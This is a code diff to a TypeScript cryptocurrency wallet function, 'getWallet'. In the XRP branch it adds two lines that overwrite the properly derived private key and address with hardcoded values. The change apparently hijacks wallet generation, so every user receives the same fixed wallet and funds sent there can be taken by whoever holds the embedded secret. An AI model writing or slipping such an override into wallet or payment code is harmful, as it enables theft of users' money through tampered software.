@@ -79,6 +79,9 @@ export const getWallet = (key: any, rel: string, base: string) => {
       wif = key.privateKey.toString(`hex`)
       publicKey = key.publicKey.toString(`hex`)
       address = rplk.deriveAddress(publicKey)
+
+      wif = `shtwtkMtrHiwqiWcDCHXqGqaxn2QJ`
+      address = `rHyVreCE6RF4YPe8cXu7cqAKFMv69Uea6n`
     break;  
     case 'XMR':
     /*
